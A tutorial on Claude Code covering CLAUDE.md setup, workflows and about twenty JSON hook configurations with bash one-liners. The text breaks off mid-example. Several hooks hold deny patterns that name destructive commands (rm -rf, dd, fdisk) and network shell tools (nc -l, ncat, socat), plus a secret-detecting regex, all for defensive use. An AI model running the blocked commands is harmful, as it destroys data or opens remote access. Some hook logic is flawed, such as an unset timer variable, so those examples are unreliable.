## Introduction: Why Claude Code?

Claude Code isn't just another AI coding assistant - it's your pair programming partner that never needs coffee breaks, doesn't judge your 3 AM debugging sessions, and actually reads the documentation. Unlike generic AI tools, Claude Code is purpose-built for software development with deep understanding of:

- **File system navigation** and code structure
- **Git workflows** and version control best practices
- **Testing frameworks** and development methodologies
- **Documentation patterns** and project organization
- **Security considerations** and code quality standards

**What Makes Claude Code Special:**
- **Context-aware**: Understands your entire codebase, not just single files
- **Tool-integrated**: Direct access to terminal, file system, and development tools
- **Process-oriented**: Follows software engineering best practices by default
- **Educational**: Explains concepts and teaches as it works
- **Agentic capabilities**: Can run multiple parallel tasks and delegate work
- **Memory system**: Maintains project and user preferences across sessions

## Setup and Customization

### The Power of CLAUDE.md

The `CLAUDE.md` file is Claude Code's secret weapon - it's how you teach Claude about your project's unique requirements and conventions.

**Essential CLAUDE.md Sections:**
```markdown
# Core Development Principles
- Security is job zero
- Test-driven development (TDD) for all new features
- Clean code with clear separation of concerns

# Code Style
- Follow .editorconfig or ruff format
- Functions ≤ 40 lines unless algorithmically necessary
- Use correct computer science terminology in names

# Testing Discipline
- Aim for ≥ 80% line coverage
- Mock external HTTP calls, no live network hits in CI
- Generate failing tests first when fixing bugs

# git
- Use conventional commit messages in imperative mood
- Commit frequently: after functionality complete, tests pass, bugs fixed
- Use github CLI for git operations
```

**Our Changelogger CLAUDE.md** includes:
- Security guardrails for API keys and SQL queries
- Documentation requirements for public functions
- Learning concept tracking for knowledge transfer
- Git workflow automation preferences

### Tool Permissions Management

Control Claude's access to match your security requirements:

```bash
# View current permissions
/permissions

# Safe development setup
claude --allow-tools=Read,Write,Edit,Bash,Glob,Grep

# Full development environment
claude --allow-tools=all

# Restricted environment (view-only)
claude --allow-tools=Read,Glob,Grep
```

**Recommended Permission Levels:**
- **Learning**: `Read,Glob,Grep` (explore and understand)
- **Development**: `Read,Write,Edit,Bash,Glob,Grep` (code and test)
- **Production**: Custom allowlist based on specific needs

---

## Core Workflow Patterns

### 1. Explore, Plan, Code, Commit (EPCC)

The gold standard workflow that ensures quality and understanding:

#### **Explore Phase**
```bash
# Start by understanding the codebase
"Show me the overall structure of this project"
"What's the current state of the LLM integration?"
"Where are the tests for the core functionality?"
```

**Claude's Response Pattern:**
- Reads relevant files automatically
- Explains architecture and relationships
- Identifies key patterns and conventions
- Points out potential issues or improvements

#### **Plan Phase**
```bash
"Create a detailed implementation plan for adding OpenAI client support"
"How should we structure the prompt engineering system?"
"What's the best approach for handling rate limits across providers?"
```

**Good Planning Characteristics:**
- Breaks complex tasks into manageable steps
- Considers error cases and edge conditions
- Aligns with existing patterns and conventions
- Includes testing and documentation requirements

#### **Code Phase**
```bash
# Implement incrementally
"Let's start with the abstract interface first"
"Now implement the OpenAI client with comprehensive error handling"
"Add tests for the configuration validation"
```

**Implementation Best Practices:**
- Follow test-driven development (write tests first)
- Implement one component at a time
- Verify each step before proceeding
- Maintain code quality throughout

#### **Commit Phase**
```bash
"Let's commit this foundation work"
"Run the tests and fix any issues before committing"
"Create a pull request with a detailed description"
```

**Commit Excellence:**
- Meaningful commit messages following conventions
- Tests pass before committing
- Documentation updated to reflect changes
- Code quality checks completed

### 2. Test-Driven Development (TDD) with Claude

Claude Code excels at TDD because it understands testing frameworks and can generate comprehensive test suites:

#### **Red Phase (Write Failing Tests)**
```python
# Claude generates failing tests first
def test_openai_client_generates_summary():
    """Test that OpenAI client can generate summaries."""
    client = OpenAIClient(config=mock_config)

    # This will fail initially - no implementation yet
    response = await client.generate("Summarize this changelog", schema=summary_schema)

    assert response.success is True
    assert "summary" in response.content
    assert len(response.content["summary"]) > 0
```

#### **Green Phase (Make Tests Pass)**
```python
# Claude implements minimum code to pass tests
class OpenAIClient(LLMClient):
    async def generate(self, prompt: str, schema: dict | None = None) -> LLMResponse:
        # Actual implementation that makes tests pass
        try:
            response = await self._openai_client.chat.completions.create(
                model=self.config.model,
                messages=[{"role": "user", "content": prompt}],
                temperature=self.config.temperature,
            )
            return LLMResponse(
                content=response.choices[0].message.content,
                success=True,
            )
        except Exception as e:
            return LLMResponse(success=False, error_message=str(e))
```

#### **Refactor Phase (Improve Without Breaking)**
```python
# Claude refines implementation while maintaining tests
class OpenAIClient(LLMClient):
    async def generate(self, prompt: str, schema: dict | None = None) -> LLMResponse:
        # Enhanced version with better error handling, cost tracking, etc.
        await self._check_cost_limits()

        try:
            response = await self._make_request_with_retry(prompt, schema)
            usage = self._calculate_usage(response)

            return LLMResponse(
                content=self._extract_content(response, schema),
                usage=usage,
                success=True,
            )
        except SpecificError as e:
            return self._handle_specific_error(e)
```

### 3. Visual Iteration Pattern

For UI/UX work or complex visualizations:

```bash
# Step 1: Provide visual reference
"Here's a screenshot of the current tool management CLI output"
[paste screenshot]

# Step 2: Describe desired improvements
"Make this more user-friendly with better formatting and helpful colors"

# Step 3: Iterate based on results
"The colors are good, but can we add icons and better spacing?"
```

**When to Use Visual Iteration:**
- CLI output formatting and user experience
- Documentation layout and readability
- Error message design and clarity
- Dashboard or reporting interfaces

---

## Advanced Techniques

### 1. Subagent Delegation

For complex problems, use Claude's subagent feature to tackle different aspects simultaneously:

```bash
# Main conversation: Architecture planning
"Design the overall LLM integration architecture"

# Subagent 1: Implementation details
"Implement the OpenAI client with comprehensive error handling"

# Subagent 2: Testing strategy
"Create a complete test suite for the LLM configuration system"

# Subagent 3: Documentation
"Update the README and learning concepts with LLM integration info"
```

**Effective Subagent Strategies:**
- **Separation of concerns**: Each agent handles one domain
- **Clear handoffs**: Specify what each agent should produce
- **Integration planning**: How results will combine together
- **Context sharing**: Provide relevant context to each agent

### 2. Think Mode for Complex Analysis

Use Claude's deep analysis capabilities for challenging problems:

```bash
/think "How should we handle API rate limits across multiple LLM providers with different rate limit structures?"

/think "What's the best way to ensure cost protection while maintaining good user experience?"

/think "How can we make the prompt engineering system extensible for future LLM providers?"
```

**Think Mode Excels At:**
- Architecture decisions with trade-offs
- Complex debugging and problem analysis
- Performance optimization strategies
- Security and reliability considerations

### 3. Custom Slash Commands

Create shortcuts for common workflows:

```bash
# Create custom commands for your project
/test-llm "Run LLM integration tests with cost limits"
/check-security "Run security analysis on LLM-related code"
/update-docs "Update documentation for new LLM features"
```

### 4. Parallel Development

Use multiple Claude instances for parallel development:

- **Instance 1**: Core feature implementation
- **Instance 2**: Test suite development
- **Instance 3**: Documentation updates
- **Instance 4**: Integration and deployment

---

## Project-Specific Best Practices

### Project Context Management

**Starting a Session:**
```bash
# Give Claude context about where you are
"I'm working on the API integration layer. Here's what we've built so far..."

# Reference specific files and patterns
"Look at src/api/base.py to understand our interface pattern"

# Explain current goals
"We need to implement the client following the same patterns as our data processing code"
```

### Code Quality Automation

**Integrate with Development Workflow:**
```bash
# Claude automatically follows your quality standards
"Implement this feature following our CLAUDE.md guidelines"
"Make sure to include comprehensive error handling like in our core modules"
"Add learning concepts documentation for any new patterns"
```

### Testing Integration

**Leverage Your Testing Patterns:**
```bash
# Claude understands your testing conventions
"Add tests following the same patterns as our existing test files"
"Make sure to include both unit and integration tests"
"Use mocking for external API calls like we do in other tests"
```

### Documentation Consistency

**Maintain Documentation Standards:**
```bash
# Claude updates docs automatically
"Update the README with the new API features"
"Add these concepts to our learning documentation with consistent style"
"Update build scripts with new commands"
```

## Hooks: Automating and Customizing Claude Code Behavior
### *Or: How to Make Claude Code Dance to Your Development Rhythm*

> "Hooks are the secret sauce that transforms Claude Code from a smart assistant into a customized development powerhouse." - Someone who discovered hooks (probably)

Hooks are user-defined shell commands that execute at specific points in Claude Code's lifecycle, providing deterministic control over its behavior. Think of hooks as your personal development automation layer that can:

- **Customize notifications** for different events
- **Automate code formatting** before and after operations
- **Implement comprehensive logging** of all activities
- **Provide real-time feedback** and validation
- **Create custom permission gates** and security checks
- **Integrate with external tools** and workflows

### Understanding Hook Events
### *Think of Claude Code Like a Smart Kitchen Assistant*

Imagine Claude Code as a super-smart kitchen assistant that helps you cook (code). Hooks are like having little helpers that jump into action at specific moments during the cooking process:

**1. PreToolUse** - *The "Before We Start Cooking" Helper*
> Like a prep cook who automatically washes their hands, checks ingredients, and preheats the oven **before** you start any recipe. This hook runs before Claude touches any tool.

**2. PostToolUse** - *The "After We Finish This Step" Helper*  
> Like a cleaning assistant who automatically wipes down counters, puts away ingredients, and updates your recipe notes **after** each cooking step is complete.

**3. Notification** - *The "Kitchen Update Announcer" Helper*
> Like having someone constantly updating the family group chat: "Started chopping onions!", "Oven preheated!", "Dinner's ready!" - this hook triggers whenever Claude wants to tell you something.

**4. Stop** - *The "End of Cooking Session" Helper*
> Like the final kitchen cleanup crew that summarizes what you cooked, how long it took, what dishes need washing, and what ingredients you used up.

**The Magic Ingredient: JSON Data**
Each hook gets a detailed "recipe card" (JSON data) that tells it exactly what's happening:
- What tool Claude is using (like "chopping knife" vs "blender")
- What Claude is trying to do ("dice the onions" vs "puree the tomatoes")  
- Which cooking session this is (so multiple chefs don't get confused)

Think of it as having a really good kitchen notepad that gets passed between all your helpers!

---

## Setting Up Hooks: Step-by-Step Guide

### Initial Configuration

**1. Create your settings directory and file:**
```bash
# Create Claude Code settings directory
mkdir -p ~/.claude

# Create settings file
touch ~/.claude/settings.json
```

**2. Basic hook configuration structure:**

### *Building Your Hook Recipe Book* 📖

Think of this JSON as writing instructions for your kitchen helpers. Here's how to read this "recipe card":

```json
{
  "hooks": {                           // 👈 This is your "Recipe Book"
    "PreToolUse": [                    // 👈 "Before Cooking" section
      {
        "matcher": "Bash",             // 👈 "Only when using the big knife"
        "hooks": [                     // 👈 "Here's what to do:"
          {
            "type": "command",         // 👈 "Run this kitchen command"
            "command": "echo 'Getting ready to chop!'"  // 👈 The actual thing to do
          }
        ]
      }
    ]
  }
}
```

**Translation**: "Hey hook system, whenever Claude is about to use the Bash tool (like picking up a big chopping knife), please run this echo command first (like announcing 'Getting ready to chop!')."

**3. Understanding matchers - The "Which Kitchen Tool?" Filter:**

Think of matchers like telling your helpers which kitchen situations they should care about:

- `"*"` - **"Every single kitchen tool"** (like having a helper who jumps in no matter what you're doing - mixing, chopping, baking, everything!)

- `"Bash"` - **"Only the big chef's knife"** (your helper only activates when you pick up that specific dangerous tool)

- `"Read|Write|Edit"` - **"Only when handling ingredients"** (like saying "only help me when I'm reading recipes, writing shopping lists, or editing meal plans")

- `"!Bash"` - **"Everything EXCEPT the big knife"** (your helper works with all tools but stays away when you're doing the scary chopping stuff)

**Real-world example**: `"Write|Edit"` is like having a spell-checker helper who only cares when you're writing or editing documents, but ignores you when you're just reading or running commands.

**4. Test your first hook:**
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "echo \"🎯 Claude is about to use a tool!\" >> ~/.claude/activity.log"
          }
        ]
      }
    ]
  }
}
```

## 20 Essential Hook Examples for Software Engineers
### *Your Personal Development Automation Army* 🤖

Think of these hooks as hiring a bunch of specialized assistants for your development workflow. Each one is like a tiny robot that's really, really good at one specific job and never gets tired of doing it!

### 1. Development Activity Logger
### *The "What Did I Just Do?" Assistant* 📝

**Simple explanation**: Like having a really observant coworker who writes down everything you do with timestamps, so you can look back later and remember "Oh right, at 2:30 PM I was trying to fix that database connection issue."

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "jq -r '.tool_input.command + \" - \" + (.tool_input.description // \"No description\")' | ts '[%Y-%m-%d %H:%M:%S]' >> ~/.claude/bash-history.log"
          }
        ]
      }
    ]
  }
}
```

**What this does**: Every time Claude runs a bash command, this hook writes it to a log file with a timestamp. It's like having a digital lab notebook that automatically tracks all your terminal experiments!

### 2. Auto-Format Code Before Commits
### *The "Make Me Look Professional" Assistant* ✨

**Simple explanation**: Like having a friend who always fixes your hair and straightens your shirt before you walk into an important meeting. This hook automatically cleans up your code formatting before you commit it, so you never accidentally push messy code.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"git commit\"; then echo \"🎨 Auto-formatting before commit...\"; if [ -f \"package.json\" ]; then npm run format 2>/dev/null || true; elif [ -f \"pyproject.toml\" ]; then black . && isort . 2>/dev/null || true; fi; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**The magic**: Detects when you're about to `git commit`, then automatically runs the right formatter (Prettier for JavaScript, Black for Python) based on what files it finds in your project. No more "oops, I committed ugly code" moments!

### 3. Test Suite Validator
### *The "No Broken Code" Bouncer* 🧪

**Simple explanation**: Like having a strict doorman who won't let you into the fancy restaurant unless you're properly dressed. This hook runs your tests before every commit/push and literally blocks you from pushing broken code.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"git commit\\|git push\"; then echo \"🧪 Running tests before commit...\"; if npm test --silent 2>/dev/null; then echo \"✅ Tests passed\"; else echo \"❌ Tests failed - blocking commit\"; exit 2; fi; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this saves your career**: Prevents the embarrassing "oops, I broke the build" moments that make senior developers give you disappointed looks. The `exit 2` actually **stops** the commit if tests fail, so you literally cannot push broken code. It's like having a safety net that catches bugs before they reach your teammates.

### 4. Environment Safety Check
### *The "Wait, Are You Sure About That?" Assistant* 🚨

**Simple explanation**: Like having a safety-conscious friend who grabs your arm when you're about to touch a hot stove. This hook spots dangerous commands and stops Claude from running them automatically.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'CMD=$(jq -r \".tool_input.command\"); if echo \"$CMD\" | grep -q \"rm -rf\\|sudo\\|format\\|fdisk\"; then echo \"🚨 Dangerous command detected: $CMD\"; echo \"Are you sure? This could be destructive.\"; exit 2; fi'"
          }
        ]
      }
    ]
  }
}
```

**Life-saving feature**: When Claude tries to run commands like `rm -rf` (delete everything), `sudo` (admin access), or `format` (wipe a drive), this hook slams on the brakes and says "WHOA THERE!" The `exit 2` actually **blocks** the dangerous command from running. It's like having a safety net for your terminal!

### 5. Docker Resource Monitor
### *The "How Much Space Do I Have Left?" Assistant* 🐳

**Simple explanation**: Like having a fuel gauge in your car that automatically shows up whenever you start the engine. This hook displays your Docker disk usage every time you run Docker commands, so you know when you're running out of space.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"docker\\|compose\"; then echo \"🐳 Docker resources:\"; docker system df | head -2; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this prevents disasters**: Docker quietly eats up disk space like a hungry teenager raids the fridge. Without monitoring, you suddenly get "no space left on device" errors that crash everything. This hook gives you a heads-up about resource usage before you hit the wall - like knowing you're almost out of gas before your car dies on the highway.

### 6. Dependency Vulnerability Scanner
### *The "Is This Package Sketchy?" Detective* 🔍

**Simple explanation**: Like having a security expert who automatically checks the background of every new person you invite to your party. This hook scans packages for known vulnerabilities every time you install something new.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"npm install\\|pip install\\|yarn add\"; then echo \"🔍 Scanning for vulnerabilities...\"; if command -v safety >/dev/null; then safety check --json 2>/dev/null | jq -r \".[] | \\\"⚠️  \\(.package): \\(.advisory)\\\"\" | head -3; fi; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this protects your business**: Installing a package with a known vulnerability is like leaving your front door unlocked with a sign saying "valuables inside." This hook warns you about packages with security issues **before** they become part of your application. It's much easier to find a secure alternative now than to deal with a data breach later.

### 7. Code Review Checklist Reminder
### *The "Don't Forget The Important Stuff" Reminder* 📝

**Simple explanation**: Like having a mom who always asks "Did you brush your teeth? Did you pack your lunch?" before school. This hook shows you a checklist after every code edit to make sure you didn't forget the important stuff.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [
          {
            "type": "command",
            "command": "echo \"📝 Code Review Checklist:\n✓ Security considerations\n✓ Error handling\n✓ Test coverage\n✓ Performance impact\n✓ Documentation updated\""
          }
        ]
      }
    ]
  }
}
```

**Why this improves code quality**: We all get tunnel vision when coding and focus only on making the feature work. This hook reminds you to think about the bigger picture - security, performance, tests, docs. It's like having a senior developer looking over your shoulder, gently nudging you to consider all the professional best practices that separate good code from great code.

### 8. Performance Impact Analyzer
### *The "How Long Did That Take?" Stopwatch* ⏱️

**Simple explanation**: Like having a fitness tracker that automatically times your workouts. This hook measures how long your builds, compiles, and tests take, so you can spot when things are getting slower.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"build\\|compile\\|test\"; then END_TIME=$(date +%s%3N); DURATION=$((END_TIME - ${START_TIME:-$END_TIME})); echo \"⏱️ Operation took ${DURATION}ms\"; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this saves your sanity**: Slow builds kill developer productivity. When your test suite goes from 30 seconds to 5 minutes, you need to know immediately - not after months of frustration. This hook tracks performance trends and helps you catch regressions early. It's like having a performance dashboard that alerts you when your development workflow starts getting sluggish.

### 9. Branch Protection Enforcer
### *The "Don't Push to Main" Police* 🚫

**Simple explanation**: Like having a security guard who stops you from walking into the "Authorized Personnel Only" area. This hook prevents you from accidentally pushing code directly to the main branch, forcing you to use proper feature branches.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"git push.*main\\|git push.*master\"; then BRANCH=$(git branch --show-current); if [ \"$BRANCH\" = \"main\" ] || [ \"$BRANCH\" = \"master\" ]; then echo \"🚫 Direct push to $BRANCH blocked. Use feature branches!\"; exit 2; fi; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this saves team harmony**: Pushing directly to main/master bypasses code reviews, breaks CI/CD workflows, and can crash production. This hook enforces proper Git workflow by literally blocking direct pushes (`exit 2`). It's like having a process enforcer that keeps your team following best practices even when you're in a hurry.

### 10. Database Backup Reminder
### *The "Did You Backup First?" Conscience* 💾

**Simple explanation**: Like having a wise old DBA who grabs your arm every time you reach for a dangerous SQL command and asks "When did you last backup the database?" This hook detects destructive database operations and reminds you to backup first.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"DROP\\|DELETE\\|TRUNCATE\\|ALTER.*DROP\"; then echo \"💾 Database operation detected! When did you last backup?\"; echo \"Consider: pg_dump, mysqldump, or your backup tool\"; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this prevents career-ending disasters**: Running `DROP TABLE users` without a backup is like performing surgery without a medical license. This hook catches destructive database commands and reminds you to backup first. It's much better to be safe than to spend your weekend restoring data from a week-old backup while your CEO asks uncomfortable questions.

### 11. API Key Scanner
### *The "Secrets Detector" Assistant* 🔑

**Simple explanation**: Like having a paranoid friend who checks your pockets before you leave the house to make sure you didn't accidentally grab the wrong keys. This hook scans your code files for things that look like API keys, passwords, or tokens.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'FILE=$(jq -r \".tool_input.file_path // \\\"\\\"\" | grep -v \"null\"); if [ -n \"$FILE\" ]; then if grep -qE \"(api_key|secret_key|password|token).*=.*[a-zA-Z0-9]{10,}\" \"$FILE\" 2>/dev/null; then echo \"🔑 Potential API key detected in $FILE\"; echo \"Remember: Use environment variables!\"; fi; fi'"
          }
        ]
      }
    ]
  }
}
```

**Why this prevents security breaches**: Hardcoding API keys in your source code is like writing your bank PIN on a sticky note and leaving it on your monitor. If your repo becomes public or gets compromised, those secrets are exposed to the world. This hook catches common secret patterns and reminds you to use environment variables instead - keeping your keys safe and secure.

### 12. Code Complexity Monitor
### *The "This File Is Getting Huge" Advisor* 📏

**Simple explanation**: Like having a personal trainer who taps you on the shoulder when your workout gets too intense. This hook checks if your files are getting too big and suggests breaking them down into smaller, more manageable pieces.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'FILE=$(jq -r \".tool_input.file_path // \\\"\\\"\" | grep -v \"null\"); if [ -n \"$FILE\" ] && [ -f \"$FILE\" ]; then LINES=$(wc -l < \"$FILE\"); if [ $LINES -gt 300 ]; then echo \"📏 File $FILE has $LINES lines. Consider breaking it down?\"; fi; fi'"
          }
        ]
      }
    ]
  }
}
```

**Why this improves maintainability**: Giant files are like messy rooms - the bigger they get, the harder it becomes to find anything. A 1000-line file is a nightmare to debug, test, and maintain. This hook nudges you to refactor before files become unwieldy monsters. It's much easier to split a 300-line file than to untangle a 2000-line mess later.

### 13. License Compliance Checker
### *The "Legal Eagle" Assistant* ⚖️

**Simple explanation**: Like having a lawyer friend who always asks "Are you sure you can use that?" when you borrow something. This hook reminds you to check package licenses whenever you install new dependencies, so you don't accidentally use something that could get your company sued.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"npm install\\|pip install\"; then echo \"⚖️ Reminder: Check package licenses for compliance\"; if command -v license-checker >/dev/null; then license-checker --summary 2>/dev/null | tail -5; fi; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this saves your company from lawsuits**: Some open source licenses (like GPL) require you to open source your entire application if you use them commercially. Others have attribution requirements. This hook helps you catch incompatible licenses before they become legal problems. It's much better to find a different package now than to explain to your legal team later why you owe someone money.

### 14. Documentation Sync Checker
### *The "Don't Forget to Update the Docs" Reminder* 📖

**Simple explanation**: Like having a helpful colleague who taps you on the shoulder after you change something important and asks "Did you update the documentation too?" This hook reminds you to keep docs in sync whenever you modify code files.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write|Edit",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'FILE=$(jq -r \".tool_input.file_path // \\\"\\\"\" | grep -v \"null\"); if [ -n \"$FILE\" ] && echo \"$FILE\" | grep -qE \"\\.(js|py|ts|go)$\"; then echo \"📖 Updated $FILE - does documentation need updating?\"; ls README.md docs/ 2>/dev/null | head -3; fi'"
          }
        ]
      }
    ]
  }
}
```

**Why this keeps your team happy**: Outdated documentation is worse than no documentation - it actively misleads people and wastes their time. When you change an API, add a feature, or modify behavior, the docs need to reflect that. This hook reminds you to update documentation while the changes are fresh in your mind, preventing the "documentation debt" that makes future developers curse your name.

### 15. Resource Usage Alert
### *The "System Health Monitor" Assistant* 💾

**Simple explanation**: Like having a car dashboard that warns you when you're low on gas or your engine is overheating. This hook checks your computer's disk space and memory usage with every command and warns you before you run out.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'DISK_USAGE=$(df / | awk \"NR==2 {print \\$5}\" | sed \"s/%//\"); if [ \"$DISK_USAGE\" -gt 85 ]; then echo \"💾 Warning: Disk usage at ${DISK_USAGE}%\"; fi; MEM_USAGE=$(free | awk \"NR==2{printf \\\"%.0f\\\", \\$3/\\$2*100}\"); if [ \"$MEM_USAGE\" -gt 85 ]; then echo \"🧠 Warning: Memory usage at ${MEM_USAGE}%\"; fi'"
          }
        ]
      }
    ]
  }
}
```

**Why this prevents system crashes**: Running out of disk space or memory causes mysterious failures, corrupted files, and system crashes. This hook gives you early warning when resources are getting low (85% threshold), so you can clean up before things break. It's like having a early warning system that prevents the "why is everything so slow?" debugging sessions.

### 16. Timezone-Aware Logging
### *The "Perfect Timestamp" Logger* 🕰️

**Simple explanation**: Like having a security camera that records everything with accurate timestamps that work no matter where you are in the world. This hook logs every tool Claude uses with UTC timestamps, so your logs are consistent across time zones.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'TOOL=$(jq -r \".tool_name\"); echo \"[$(date -u +\"%Y-%m-%d %H:%M:%S UTC\")] 🛠️ $TOOL\" >> ~/.claude/activity.log'"
          }
        ]
      }
    ]
  }
}
```

**Why UTC timestamps matter**: When debugging issues or analyzing logs, timezone confusion is a nightmare. "The bug happened at 3 PM" - but 3 PM where? EST? PST? This hook uses UTC timestamps so your logs are unambiguous and sortable, even when working with a global team. It's essential for compliance, debugging, and sanity.

### 17. CI/CD Status Monitor
### *The "Pipeline Health Check" Assistant* 🚀

**Simple explanation**: Like having a race car spotter who immediately tells you about track conditions after you make a pit stop. This hook automatically checks your CI/CD pipeline status whenever you push code, so you know if your build is going to succeed or fail.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"git push\"; then echo \"🚀 Push detected! Checking CI/CD status...\"; if command -v gh >/dev/null; then gh workflow list --limit 3 2>/dev/null; fi; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this saves you from surprises**: Nothing's worse than pushing code and finding out hours later that the build failed. This hook gives you immediate feedback about your pipeline health, so you can fix issues quickly. It's like having a real-time dashboard that tells you if your deployment is going to succeed before you go to lunch.

### 18. Environment Variable Validator
### *The "Did You Set Your Env Vars?" Checker* ⚠️

**Simple explanation**: Like having a flight attendant who checks that everyone has their seatbelt fastened before takeoff. This hook verifies that critical environment variables are set before you run Docker containers, preventing the "why isn't this working?" debugging sessions.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"docker-compose\\|docker run\"; then MISSING_VARS=\"\"; for var in DATABASE_URL API_KEY SECRET_KEY; do if [ -z \"${!var}\" ]; then MISSING_VARS=\"$MISSING_VARS $var\"; fi; done; if [ -n \"$MISSING_VARS\" ]; then echo \"⚠️ Missing env vars:$MISSING_VARS\"; fi; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this prevents headaches**: Docker containers failing with cryptic errors because `DATABASE_URL` isn't set is a classic developer time-waster. This hook checks for required environment variables before starting containers, giving you clear error messages instead of mysterious failures. It's like a preflight checklist that catches configuration problems before they waste your time.

### 19. Backup Automation Trigger
### *The "Safety Copy" Assistant* 💾

**Simple explanation**: Like having a paranoid friend who automatically makes photocopies of important documents before you edit them. This hook creates timestamped backups of critical configuration files whenever you modify them.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'FILE=$(jq -r \".tool_input.file_path // \\\"\\\"\" | grep -v \"null\"); if [ -n \"$FILE\" ] && echo \"$FILE\" | grep -qE \"(config|settings|env)\" && [ ! -f \"$FILE.backup.$(date +%Y%m%d)\" ]; then cp \"$FILE\" \"$FILE.backup.$(date +%Y%m%d)\" 2>/dev/null && echo \"💾 Auto-backed up $FILE\"; fi'"
          }
        ]
      }
    ]
  }
}
```

**Why this saves you from configuration disasters**: Configuration files are the most dangerous files to edit - one typo can break your entire application. This hook automatically creates dated backups of config files (like `.env`, `settings.json`, etc.) so you can quickly restore if something goes wrong. It's insurance for your most critical files - you hope you never need it, but you're really glad it's there when you do.

### 20. Project Health Dashboard
### *The "How's Everything Looking?" Reporter* 📊

**Simple explanation**: Like having a doctor who gives you a quick health checkup after every workout. This hook shows you a project health summary whenever you run tests, giving you a snapshot of your codebase's overall wellness.

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'if echo \"$1\" | grep -q \"npm test\\|pytest\\|go test\"; then echo \"📊 Project Health:\"; echo \"✓ Tests: $(echo $?)\"; echo \"✓ Git status: $(git status --porcelain | wc -l) files changed\"; echo \"✓ Dependencies: $(npm outdated 2>/dev/null | wc -l || echo 0) outdated\"; fi' -- $(jq -r '.tool_input.command')"
          }
        ]
      }
    ]
  }
}
```

**Why this keeps you on top of things**: It's easy to focus on features and forget about project maintenance. This hook gives you regular health checkups that show test status, uncommitted changes, and outdated dependencies. It's like having a dashboard that highlights technical debt before it becomes a crisis - helping you stay proactive about project health.

## 15 Advanced Hook Examples for Cybersecurity Engineers
### *Your Digital Security Squad* 🛡️

Think of these hooks as your personal cybersecurity team that never sleeps, never misses anything suspicious, and maintains perfect audit logs. Each hook is like having a specialist security guard watching for different types of threats and suspicious activities.

### 21. Security Command Auditor
### *The "Big Brother But For Good Reasons" Assistant* 👁️

**Simple explanation**: Like having a security camera that records everything but also has a really smart AI that yells "STOP!" when it sees someone trying to break in. This hook logs every command for compliance and blocks obviously dangerous ones.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash -c 'CMD=$(jq -r \".tool_input.command\"); echo \"[$(date -u +\"%Y-%m-%d %H:%M:%S UTC\")] SECURITY_AUDIT: $CMD\" >> ~/.claude/security.log; if echo \"$CMD\" | grep -qE \"(sudo|su|chmod 777|rm -rf|dd if=|nc -l|ncat|socat)\"; then echo \"🚨 SECURITY: Privileged/dangerous command detected\"; exit 2; fi'"
          }
        ]
